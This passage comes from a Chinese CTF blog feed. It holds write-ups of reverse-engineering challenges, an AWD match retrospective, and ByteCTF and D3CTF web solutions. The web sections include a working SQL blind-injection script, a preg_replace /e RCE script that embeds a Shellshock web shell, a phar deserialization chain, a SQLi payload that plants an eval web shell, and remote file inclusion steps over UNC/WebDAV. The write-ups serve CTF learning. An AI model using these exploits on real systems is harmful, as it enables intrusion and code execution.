！！</p><p>然后可以载入OD进行动态分析了。</p><p>为了方便调试，我们知道程序运行后，会提示输入字符串，那么我们先找到输入字符串的地方。</p><p>然后开始单步跟踪到这里，就是完成字符串输入后</p><p>继续跟踪，我们发现一个base64的字符串：dQkLdqXP=mLMAa8p=lnncQcq/GEPdGKXcNDl=Mnr=pcoBGPQdG1NA3Aw</p><p>那么另外一个字符串就是base64的字典了，也就是：0123456789+/=ABCDEFGHIabcdefghiJKLMNOPQRSTUVWXYZjklmnopqrstuvwxyz</p><p>于是，我们就可以根据这个对base64zi’f字符串进行解密：</p><p>坑了，竟然是乱码，还以为就这样搞定了呢，后来请教了一下大神，他说是字典有问题，于是我仔细的看了一下，确实</p><p>字典里面按说是不应该有‘=’ 这个字符的，按base64的说法这个是占位用的来补足字节数。所以按照大神的指点，我把大神的脚本用C++重新写了一遍（也是为了更好的理解反向分析的过程），终了跑出来了 T_T</p><p>最后，就是见证奇迹的时刻到了 * ^_^ *</p><p>flag{e38b5b63-4bf7-4ee8-b422-83f599fe0c43}</p><h3 id="Md5Jungle"><a href="#Md5Jungle" class="headerlink" title="Md5Jungle"></a>Md5Jungle</h3><p>首先查壳，丢到exeinfope里面一看，发现是asp的壳。</p><p>于是用手头的asp脱壳工具尝试脱壳，发现都不行，不是不支持就是报错！没办法，只能老实手工脱壳了。</p><p>根据ESP定律+IAT修复+重定向表修复后，脱壳的程序可以正常运行。</p><p>用OD载入后，开始单步跟踪</p><p>到用户输入界面，我随便输入了个字符串：111111111（9个1）单步跟入到下图，发现了flag字样</p><p>这个应该是flag的头，于是继续跟进，发现确实在核对输入数据与flag{比较，这块就过不去了</p><p>于是果断的从来，输入数据为 flag{111111111，来到了下图的地方，在0x16的位置比较0x7D 也就是’}’符号</p><p>由于C语言的字符串下标是从0开始的，也就是字符串第23个字符处必须是}</p><p>于是构造字符串：flag{11111111111111111} 继续跟进，接下来是在0x7、0xc、0x11处核对字符 ‘-‘ (即：0x2D)</p><p>于是字符串就变成了flag{11-1111-1111-1111}，继续跟进，发现了一个字符串：01E3421C=dump_SCY.01E3421C (ASCII “c7218260ef2b966ab0454e07c55cf4e9”)<br>感觉像是MD5的字符串，于是用python解了一下，得到： oh，结之前的flag应该就是flag{oh-1111-1111-1111}</p><p>再次输入后，继续跟进发现过去了，开始进行第二段的比较得到了下图的错误：</p><p>于是反复跟比较算法也没有找到任何有效的数据，结合本题的提示是md5段字节爆破，估计是这块需要进行爆破处理了。</p><p>于是继续python大法，得到字符串：flag{oh-aa30-1111-1111}</p><p>继续输入后，单步跟进，此时发现一个字符串：堆栈地址=001DFC30, (ASCII “YTkxYQ==”)   eax=786B5459<br>看起来像B64编码，于是尝试解码，得到第三组的flag值：a91a 。</p><p>想起之前用od也看过字符串，于是找到第四组的字符串：NGZicA==   ，解码为：4fbp</p><p>那么最终的flag就是：flag{oh-aa30-a91a-4fbp}</p><h3 id="shy"><a href="#shy" class="headerlink" title="shy"></a>shy</h3><p> 首先查壳，丢到ExeinfoPE里面看一下，确定是upx壳</p><p>于是丢到OD里面进行脱壳处理，由于是压缩壳，跟踪起来比较麻烦，我选择了个偷懒的办法，下一个api访问断点</p><p>即：VirtualProtect ，运行3次F9后就跑飞了，于是在2次运行后，单步跟踪，到OEP</p><p>使用OD自带的插件进行脱壳，注意基址和OEP的关系，计算好后填入</p><p>然后点击脱壳，双击发现不能运行。</p><p>这个问题估计是重定向造成，于是修复一下重定向表的数据。</p><p>保存后，再次运行可以正常跑起来了</p><p>再次用OD载入，发现入口地址不是OEP</p><p>按说是已经解密完成了，于是我定位到OEP （0x1072940）一看究竟。</p><p>确实已经解密，那么为了方便调试，我直接用OD改一下入口代码就可以实现了。</p><p>然后把修改完毕的程序，重新保存到文件，由于有重定位会有下图的提示，点击 是 ，然后右键保存一份dump0.exe</p><p>继续，OD载入dump0.exe 发现修改成功，可以直接跳转到OEP行，然后单步跟踪，到输入后，发现后面的代码是个加密处理的代码，于是丢到IDA里面看一下这块对应的反编译代码。</p><p>buf 就是用户输入的字符串，if ( <em>(&amp;v4 + j) != v79[j] )   这个就是关键的比较，那么V79[]就应该是异或后的结果，也就是ben本题的密钥，于是在OD中定位值：6ljh,!;:+&amp;p%i*a=Sc4#pt</em>%</p><p>接下来就简单了，直接把这个密钥输入，然后再次定位到这块就能得到flag了</p><p>最终得到flag：flag{cb7670ab-c597-4b17}   输入到shy.exe 验证一下 : )</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/04/20/byb2019/">https://www.ccreater.top/2020/04/20/byb2019/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>百越杯总结</title>
      <link href="2020/04/20/byb2019%E7%BA%BF%E4%B8%8Bawd/"/>
      <url>2020/04/20/byb2019%E7%BA%BF%E4%B8%8Bawd/</url>
      
        <content type="html"><![CDATA[<h1 id="百越杯总结"><a href="#百越杯总结" class="headerlink" title="百越杯总结"></a>百越杯总结</h1><h2 id="include-require"><a href="#include-require" class="headerlink" title="include,require"></a>include,require</h2><p>如果<strong>文件被包含两次</strong>，PHP 5   <strong>发出致命错误</strong>因为函数已经被定义，但是 PHP 4 不会对在   <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.return.html">return</a> 之后定义的函数报错。推荐使用   <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.include-once.html">include_once</a> 而不是检查文件是否已包含并在包含文件中有条件返回。 </p><h2 id="include-once-require-once"><a href="#include-once-require-once" class="headerlink" title="include_once,require_once"></a>include_once,require_once</h2><p><em>include_once</em> 语句在脚本执行期间包含并运行指定文件。此行为和   <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.include.html">include</a>   语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含。如同此语句名字暗示的那样，只会包含一次。</p><p><em>require_once</em> 语句和 <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.require.html">require</a>   语句完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。 </p><p><strong>如果所包含文件不存在,include_once不会退出,而require_once会直接退出</strong></p><h2 id="比赛失误原因"><a href="#比赛失误原因" class="headerlink" title="比赛失误原因"></a>比赛失误原因</h2><h3 id="log没挂好"><a href="#log没挂好" class="headerlink" title="log没挂好"></a>log没挂好</h3><h3 id="没有找到有效的攻击流量"><a href="#没有找到有效的攻击流量" class="headerlink" title="没有找到有效的攻击流量"></a>没有找到有效的攻击流量</h3><p>grep这个命令不够熟悉,</p><h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><p>我的过滤条件变迁:</p><p><code>&quot;flag&quot; =&gt; &quot;/flag&quot;</code>,到这里后我就没有继续过滤,”/flag”其实还是有很多干扰信息的,我就差一步</p><p><code>grep &quot;/flag &quot; */*</code></p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91fl7ptrij30k20arac7.jpg" alt="image.png"></p><p><code>grep &quot;/flag &quot; */* -C300 | grep &quot;end pageheader&quot; -C 10</code></p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91fk6h3jxj30oa05cdfx.jpg" alt="image.png"></p><h3 id="没找到的洞"><a href="#没找到的洞" class="headerlink" title="没找到的洞"></a>没找到的洞</h3><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91c2qcxxyj30pl01vdgk.jpg" alt="image.png"></p><p>php的web主要也就这两的洞</p><h4 id="grayscale"><a href="#grayscale" class="headerlink" title="grayscale"></a>grayscale</h4><p><code>include $_GET[&#39;img&#39;];</code>配合有后门的图片m.jpg</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91c4zci7cj30f001g3yg.jpg" alt="image.png"></p><p>开始我直接搜索<code>&lt;?</code>和<code>&lt;%</code> 没搜索到就以为是误报,??也能执行?????</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91c93p00wj307100zjr6.jpg" alt="image.png"></p><p>用strings查看////,编码问题导致??,以后用ascii码来查看</p><h4 id="ssystem"><a href="#ssystem" class="headerlink" title="ssystem"></a>ssystem</h4><p>虽然找到了exec那个洞</p><p>但是在index.php中：</p><pre><code class="php">&lt;?phpif (isset($_GET[&#39;page&#39;])){    $page = $_GET[&#39;page&#39;];}else{        $page = &#39;chart.php&#39;;}?&gt;&lt;?php    include_once &quot;$page&quot;;?&gt;</code></pre><p>可以配合文件上传拿到shell或者是直接include /flag也能拿到flag</p><h3 id="洞没修好"><a href="#洞没修好" class="headerlink" title="洞没修好"></a>洞没修好</h3><h4 id="SSystem"><a href="#SSystem" class="headerlink" title="SSystem"></a>SSystem</h4><pre><code class="php">    &lt;?php    if (isset($_POST[&#39;name&#39;])){        $name = $_POST[&#39;name&#39;];        exec(&quot;tar -cf backup/$name images/*.jpg&quot;);        echo &quot;&lt;div class=\&quot;alert alert-success\&quot; role=\&quot;alert\&quot;&gt;                导出成功,&lt;a href=&#39;backup/$name&#39;&gt;点击下载&lt;/a&gt;&lt;/div&gt;&quot;;    }    ?&gt;</code></pre><p>原本以为<code>$name</code>再参数位置,用escapeshellarg就可以了</p><p>但是!!!!!!!虽然escapeshellarg会把$name放在引号里面</p><pre><code>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。 </code></pre><p>php手册里解释是单引号,实际却是<code>tar -cf backup/&quot;123&quot; images/*.jpg</code></p><p>?????这是在我本机php5.6的环境下,php7环境也是双引号???</p><p>然后在自己的服务器上之前是双引号后面是单引号????</p><p>由于不知道靶场上会怎样,我也不确定我用escapeshellarg是不是修好了,然后这题就修补失败了</p><p>比较好的修复方案(在实现原功能的情况下去掉命令执行):</p><pre><code>exec(&quot;tar -cf backup/aa.tar images/*.jpg&quot;);rename(&quot;backup/aa.tar&quot;,&quot;backup/$name.tar&quot;);</code></pre><h3 id="没找到check没过的原因"><a href="#没找到check没过的原因" class="headerlink" title="没找到check没过的原因"></a>没找到check没过的原因</h3><p>check的id是172.16.4.7</p><p>但是直接搜索 HTTP 没找到check没过的原因,我猜因为拖下来的log只有前半小时,而开局的是否我们的check好像是过的</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我看到洞的时候没有修好</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/04/20/byb2019线下awd/">https://www.ccreater.top/2020/04/20/byb2019线下awd/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bytectf wp</title>
      <link href="2020/04/20/bytectfwp/"/>
      <url>2020/04/20/bytectfwp/</url>
      
        <content type="html"><![CDATA[<h1 id="bytectf-wp"><a href="#bytectf-wp" class="headerlink" title="bytectf wp"></a>bytectf wp</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="baby-blog"><a href="#baby-blog" class="headerlink" title="baby_blog"></a>baby_blog</h3><p>在edit.php中:</p><pre><code class="php">if($_SESSION[&#39;id&#39;] == $row[&#39;userid&#39;]){        $title = addslashes($_POST[&#39;title&#39;]);        $content = addslashes($_POST[&#39;content&#39;]);        $sql-&gt;query(&quot;update article set title=&#39;$title&#39;,content=&#39;$content&#39; where title=&#39;&quot; . $row[&#39;title&#39;] . &quot;&#39;;&quot;);    }</code></pre><p><code>$sql-&gt;query(&quot;update article set title=&#39;$title&#39;,content=&#39;$content&#39; where title=&#39;&quot; . $row[&#39;title&#39;] . &quot;&#39;;&quot;);</code></p><p>$row[‘title’] 没有进行任何过滤,直接插入到sql语句中,而插入数据库中的title没有再次对引号进行转义,形成注入点</p><p>sql盲注判断脚本:</p><pre><code class="python">import requestsfrom bs4 import BeautifulSoupanti_disturb_key=&#39;cjb_ccreater_s_test&#39;PHPSESSID=&#39;404i3uiletdpke9rb0egs7vf47&#39;check_article_id=20def check(check_title):    url=&#39;http://112.125.24.134:9999/edit.php?id=&#39;+str(check_article_id)    res=requests.get(url,cookies={&#39;PHPSESSID&#39;:PHPSESSID})    bs=BeautifulSoup(res.text, &#39;html.parser&#39;)    title=bs.find(&#39;input&#39;,attrs={&#39;name&#39;:&quot;title&quot;})[&#39;value&#39;]    content=bs.find(&#39;textarea&#39;,attrs={&#39;name&#39;:&quot;content&quot;}).text    if title[:len(anti_disturb_key)]!=anti_disturb_key :        return &#39;disturb&#39;    elif content!=&#39;success&#39;+check_title:        return &#39;false&#39;    else :        return &#39;success&#39;def make_write(title,info):    data={        &#39;title&#39;:title,        &#39;content&#39;:info    }    url=&#39;http://112.125.24.134:9999/writing.php&#39;    res=requests.post(url,data=data,cookies={&#39;PHPSESSID&#39;:PHPSESSID})    if res.status_code==200:        return True    else :        return Falsedef get_newest_id():    url=&#39;http://112.125.24.134:9999/index.php&#39;    res=requests.get(url,cookies={&#39;PHPSESSID&#39;:PHPSESSID})    bs=BeautifulSoup(res.text, &#39;html.parser&#39;)    newest_id=bs.find(&#39;article&#39;).find(&#39;footer&#39;).find(&#39;a&#39;)[&#39;href&#39;]    newest_id=newest_id[newest_id.index(&#39;=&#39;)+1:]    return int(newest_id)def sql_inject(sql):    title=anti_disturb_key+&quot;&#39; or (id=&quot;+str(check_article_id)+&quot; and (&quot;+sql+&#39;))#&#39;    info=&#39;success&#39;+title    if make_write(title,info):        #编辑id=newest_id的文章来读取$raw[&#39;title&#39;]        newest_id=get_newest_id()        url=&#39;http://112.125.24.134:9999/edit.php&#39;        data={            &#39;title&#39;:title,            &#39;content&#39;:info,            &#39;id&#39;:newest_id        }        res=requests.post(url,cookies={&#39;PHPSESSID&#39;:PHPSESSID},data=data)        #判断盲注结果        result=check(title)        if result==&#39;success&#39;:            return True        elif result==&#39;disturb&#39;:            print(&quot;受到干扰,重新执行&quot;)            return sql_inject(sql)        else :            return False    else :        print(&#39;程序执行错误,请保持结果&#39;)        eval(input(&#39;执行命令:&#39;))#demo #sql=&#39;(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),index,1)))=guess&#39;sql=&#39;&#39;&#39;(select&#39;&#39;+conv(substr(hex(group_concat(table_name)),index,1),16,10) FROM information_schema.tables WHERE TABLE_SCHEMA=&#39;information_schema&#39;)=guess &#39;&#39;&#39;### 数据库名:696e666f726d6174696f6e5f736368656d612c62616279626c6f67#猜information_schema表名#vip用户:wulaxc4ca4238a0b923820dcc509a6f75849bresult=&quot;4348415241435445525F534554532C434F4C4C4154494F4E532C434F4C4C4154494F4E5F4348415241435445525F5345545F4150504C49434142494C4954592C434F4C554D4E532c434f4c554d4e5f50524956494c454745532c454e47494e45532c4556454e54532c46494c45532c474c4f42414c5f5354415455532c474c4f42414c5f5641524941424c45532c4b45595f434f4c554d4e5f55534147452c504152414d45544552532c504152544954494f4e532c504c5547494e532c50524f434553534c4953542c50524f46494c494e472c5245464552454e5449414c5f434f4e53545241494e54532c524f5554494e45532c534348454d4154412c534348454d415f50524956494c454745532c53455353494f4e5f5354415455532c53455353494f4e5f5641524941424c45532c535441544953544943532c5441424c45532c5441424c455350414345532c5441424c455f434f4e53545241494e54532c5441424c455f50524956494c454745532c54524947474552532c555345525f50524956494c454745532c&quot;index=len(result)while 1:    index+=1    temp=sql.replace(&#39;index&#39;,str(index))    for i in range(20):        print(&quot;猜测第&quot;+str(index)+&quot;位为:&quot;+str(i))        if sql_inject(temp.replace(&#39;guess&#39;,str(i))):            result+=hex(i)[2:]            break    print(result)    res=&#39;&#39;    for i in range(0,len(result),2):        res+=chr(int(result[i:i+2],16))    print(res)</code></pre><p>filter=<code>(SELECT|DELETE)@{0,2}(\\(.+\\)|\\s+?.+?\\s+?|(</code>|’|&quot;).<em>?(<code>|&#39;|\&quot;)|(\+|-|~|!|@:=|&quot; . urldecode(&#39;%0B&#39;) . &quot;).+?)FROM(\\(.+\\)|\\s+?.+?|(</code>|’|&quot;).</em>?(<code>|&#39;|\&quot;))</code><br>ban掉了select 语句<br>如果拿到vip权限可以用替换绕过<br><code>(select&#39;&#39;+conv(substr(hex(group_concat(table_name)),index,1),16,10) FROM information_schema.tables WHERE TABLE_SCHEMA=database())=guess</code>绕过正则过滤</p><p>拿到vip账号:wulax,密码:1,网址:<a href="http://112.126.101.16:9999" target="_blank" rel="noopener">http://112.126.101.16:9999</a></p><p>看到replace.php里的preg_replace()猜测突破点在这里,利用<code>/e%00</code>来截断末尾的斜杠,从而达到命令执行的效果</p><p>命令执行利用脚本:</p><pre><code class="python">import requestsurl=&quot;http://112.126.101.16:9999&quot;arc_id=&quot;11&quot;session=&quot;5lrk8g0oh73su3q9dbfp9l79f2&quot;text=&#39;&#39;&#39;&lt;?php # Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) # Google Dork: none # Date: 10/31/2014 # Exploit Author: Ryan King (Starfall) # Vendor Homepage: http://php.net # Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror # Version: 5.* (tested on 5.6.2) # Tested on: Debian 7 and CentOS 5 and 6 # CVE: CVE-2014-6271 function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.c:283    $tmp = tempnam(&quot;.&quot;,&quot;data&quot;);    $headers =  &#39;MIME-Version: 1.0&#39; . &quot;\r\n&quot;;     $headers .= &#39;From: Your name &lt;info@address.com&gt;&#39; . &quot;\r\n&quot;;    $headers .= &#39;Content-type: text/html; charset=iso-8859-1&#39; . &quot;\r\n&quot;;    putenv(&quot;PHP_LOL=() { x; }; $cmd &gt;$tmp 2&gt;&amp;1&quot;);    // In Safe Mode, the user may only alter environment variableswhose names    // begin with the prefixes supplied by this directive.    // By default, users will only be able to set environment variablesthat    // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty,    // PHP will let the user modify ANY environment variable!    mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,$headers,&quot;-bv&quot;); // -bv so we don&#39;t actuallysend any mail    $output = @file_get_contents($tmp);    @unlink($tmp);    if($output != &quot;&quot;) return $output;    else return &quot;No output, or not vuln.&quot;; } echo shellshock($_REQUEST[&quot;cmd&quot;]); ?&gt;&#39;&#39;&#39;def edit():    data={        &quot;title&quot;:&quot;bbb&quot;,        &quot;content&quot;:&quot;b&quot;,        &quot;id&quot;:arc_id    }    return requests.post(url+&quot;/edit.php&quot;,data=data,cookies={&quot;PHPSESSID&quot;:session})def exec(s):    data={        &quot;replace&quot;:s,#&quot;var_dump(scandir(&#39;/tmp&#39;));var_dump(file_put_contents(&#39;/tmp/aaa.php&#39;,&quot;+&quot;$_POST[&#39;cmd&#39;]&quot;+&quot;));&quot;,        &quot;regex&quot;:&quot;1&quot;,        &quot;id&quot;:arc_id,        &quot;find&quot;:&quot;b/e\x00&quot;,        &quot;cmd&quot;:&quot;ls -al&quot;,        &quot;filepath&quot;:&quot;/tmp/hpdoger.php&quot;    }    result=requests.post(url+&quot;/replace.php&quot;,data=data,cookies={&quot;PHPSESSID&quot;:session})    edit()    return resultwhile 1:    print(exec(input()).text)</code></pre><p>emmmm..到这里就不会做了.到头了.</p><p>后来发现有个antsystem()</p><p>vardump(antsystem(‘/readfile’));</p><h3 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h3><p>哈希扩展攻击拿到admin权限</p><p>代码审计发现</p><p>在config.php下</p><pre><code class="php">class File{    public $filename;    public $filepath;    public $checker;    function __construct($filename, $filepath)    {        $this-&gt;filepath = $filepath;        $this-&gt;filename = $filename;    }    function __destruct()    {        if (isset($this-&gt;checker)){            $this-&gt;checker-&gt;upload_file();        }    }    public function view_detail(){        if (preg_match(&#39;/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i&#39;, $this-&gt;filepath)){            die(&quot;nonono~&quot;);        }        $mine = mime_content_type($this-&gt;filepath);        $store_path = $this-&gt;open($this-&gt;filename, $this-&gt;filepath);        $res[&#39;mine&#39;] = $mine;        $res[&#39;store_path&#39;] = $store_path;        return $res;    }}</code></pre><p>过滤phar并且明明没有给<code>$checker</code>赋值的点,在销毁的时候却会调用它,明显是一个为了出题而写的地方猜测phar反序列化利用,而mime_content_type()恰好又是反序列化的利用点</p><p>最后在view.php处找到调用view_detail的地方</p><p>由于题目不限制.php文件的上传,但是题目会写一个非法.htaccess</p><p>所以我们可以可以试着删除它</p><p>构造pop链:</p><p><code>FILE::view_detail(mime_content_type)-&gt;FILE::__destruct(upload_file())-&gt;Profile::__call(open())-&gt;ZipArchive::open(file,ZipArchive::OVERWRITE)</code></p><p>phar文件生成后就是要考虑如何绕过<code>(^phar)</code>的限制,</p><p>我觉得这才是这一题最骚的地方:</p><p><code>filepath=php://filter/resource=phar://sandbox/a87136ce5a8b85871f1d0b6b2add38d2/dd7ec931179c4dcb6a8ffb8b8786d20b.txt</code></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><p>这次最开心的就是做misc的题目</p><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><h3 id="betgame"><a href="#betgame" class="headerlink" title="betgame"></a>betgame</h3><p>发现猜拳规律</p><p>计算机第一次出与被显示的选择克制的选择(显示:s,实际出:j)</p><p>计算机第二次出与克制显示的选择的选择(显示:s,实际出:b)</p><p>计算机第三次出显示的选择(显示:s,实际出:s)</p><p>然后手动pk :D</p><h3 id="jigsaw"><a href="#jigsaw" class="headerlink" title="jigsaw"></a><strong>jigsaw</strong></h3><p><img src="https://i.loli.net/2019/09/09/eDQhxkWYUsvZdVa.png" alt="image.png"></p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/04/20/bytectfwp/">https://www.ccreater.top/2020/04/20/bytectfwp/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>d3ctf</title>
      <link href="2020/04/20/d3ctf2019/"/>
      <url>2020/04/20/d3ctf2019/</url>
      
        <content type="html"><![CDATA[<h1 id="d3ctf"><a href="#d3ctf" class="headerlink" title="d3ctf"></a>d3ctf</h1><p>疯狂涨姿势，就很nice</p><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p> <a href="https://github.com/wqmsybpw/wqmsybpw.github.io/blob/1401b571d975fec748a84a47691e468187a80ef8/_posts/2019-11-25-2019d3ctf-writeup.md" target="_blank" rel="noopener">https://github.com/wqmsybpw/wqmsybpw.github.io/blob/1401b571d975fec748a84a47691e468187a80ef8/_posts/2019-11-25-2019d3ctf-writeup.md</a> </p><p> <a href="https://nikoeurus.github.io/2019/11/26/D^3ctf-Web/" target="_blank" rel="noopener">https://nikoeurus.github.io/2019/11/26/D%5E3ctf-Web/</a> </p><p> <a href="https://www.anquanke.com/post/id/193939#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193939#h3-4</a> </p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ezweb"><a href="#ezweb" class="headerlink" title="ezweb"></a>ezweb</h3><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g97tefki11j30ao01s743.jpg" alt="image.png"></p><p>和username有关?</p><p>x  注册一个用户名为:<code>*/echo 1231231231;/*</code>的用户</p><p>二次注入,User 的index方法调用get_view</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g985asdayuj30pm027dfx.jpg" alt="image.png"></p><p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g985c901tuj30u208vmxr.jpg" alt="image.png"></p><p>利用替换{来绕过select 和 union的过滤,利用0x….来绕过{的过滤</p><p>最后的payload</p><p>注册一个用户名为<code>aaa&#39; unio{n selec}t 0x7B7B7068707D7D6576616C28245F504F53545B615D293B7B7B2F7068707D7D limit 1,1#</code>成功拿到shell权限</p><p> d3ctf{Th4at’s_A_Si11y_P0p_chi4n} </p><h3 id="fakeonlinephp"><a href="#fakeonlinephp" class="headerlink" title="fakeonlinephp"></a>fakeonlinephp</h3><p>报错</p><pre><code>Warning: include(): http:// wrapper is disabled in the server configuration by allow_url_include=0 in C:\Users\w1nd\Desktop\web\nginx-1.17.6\html\index.php on line 1Warning: include(http://39.108.164.219:60005/1.txt): failed to open stream: no suitable wrapper could be found in C:\Users\w1nd\Desktop\web\nginx-1.17.6\html\index.php on line 1Warning: include(): Failed opening &#39;http://39.108.164.219:60005/1.txt&#39; for inclusion (include_path=&#39;.;C:\Users\Public\Videos;\c:\php\includes;c:\php\pear;&#39;) in C:\Users\w1nd\Desktop\web\nginx-1.17.6\html\index.php on line 1</code></pre><p>虽然禁用了http协议,但是还是会发送请求</p><p>unc路径远程文件包含</p><p>一键启动一个webdav服务器</p><p><code>docker run -v /root/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav</code>然后把php文件放到/root/webdav/data里就行了</p><p><a href="http://02f4483e31.fakeonelinephp.d3ctf.io/?orange=C:/Users/w1nd/AppData/Local/Temp/fffffffffuckccrf" target="_blank" rel="noopener">http://02f4483e31.fakeonelinephp.d3ctf.io/?orange=C:/Users/w1nd/AppData/Local/Temp/fffffffffuckccrf</a></p><p>eval($_COOKIE[‘a’]);</p><p>whois</p><pre><code>Domain Name: D3CTF.IORegistry Domain ID: D503300001132938421-LRMSRegistrar WHOIS Server: whois.namesilo.comRegistrar URL: http://www.namesilo.comUpdated Date: 2019-10-14T20:31:26ZCreation Date: 2019-08-15T11:56:00ZRegistry Expiry Date: 2020-08-15T11:56:00ZRegistrar Registration Expiration Date:Registrar: Namesilo, LLCRegistrar IANA ID: 1479Registrar Abuse Contact Email: Registrar Abuse Contact Phone: +1.4805240066Reseller:Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibitedRegistrant Organization: See PrivacyGuardian.orgRegistrant State/Province: AZRegistrant Country: USName Server: DNS21.HICHINA.COMName Server: DNS22.HICHINA.COMDNSSEC: unsignedThe Registrar of Record identified in this output may have an RDDS service that can be queried for additional information on how to contact the Registrant, Admin, or Tech contact of the queried domain name.</code></pre><pre><code>本站数据：香港特别行政区 腾讯云参考数据1：香港 tencent.com参考数据2：美国兼容IPv6地址：::966D:4AEA映射IPv6地址：::FFFF:966D:4AEA</code></pre><p>whoami</p><pre><code>whoami /allUSER INFORMATION----------------User Name        SID                                         ================ ============================================172_19_97_4\w1nd S-1-5-21-330377560-317033357-2560255023-1001GROUP INFORMATION-----------------Group Name                             Type             SID          Attributes                                        ====================================== ================ ============ ==================================================Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled groupBUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled groupBUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled groupLOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled groupMandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    </code></pre><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><pre><code class="php">&lt;?phpclass dir{    public $userdir;    public $url;    public $filename;    public function __construct($url,$filename) {        $this-&gt;userdir = &quot;upload/&quot; . md5($_SERVER[&quot;HTTP_HOST&quot;]);        $this-&gt;url = $url;        $this-&gt;filename  =  $filename;        if (!file_exists($this-&gt;userdir)) {            mkdir($this-&gt;userdir, 0777, true);        }    }    public function checkdir(){        if ($this-&gt;userdir != &quot;upload/&quot; . md5($_SERVER[&quot;HTTP_HOST&quot;])) {            die(&#39;hacker!!!&#39;);        }    }    public function checkurl(){        $r = parse_url($this-&gt;url);        if (!isset($r[&#39;scheme&#39;]) || preg_match(&quot;/file|php/i&quot;,$r[&#39;scheme&#39;])){            die(&#39;hacker!!!&#39;);        }    }    public function checkext(){        if (stristr($this-&gt;filename,&#39;..&#39;)){            die(&#39;hacker!!!&#39;);        }        if (stristr($this-&gt;filename,&#39;/&#39;)){            die(&#39;hacker!!!&#39;);        }        $ext = substr($this-&gt;filename, strrpos($this-&gt;filename, &quot;.&quot;) + 1);        if (preg_match(&quot;/ph/i&quot;, $ext)){            die(&#39;hacker!!!&#39;);        }    }    public function upload(){        $this-&gt;checkdir();        $this-&gt;checkurl();        $this-&gt;checkext();        $content = file_get_contents($this-&gt;url,NULL,NULL,0,2048);        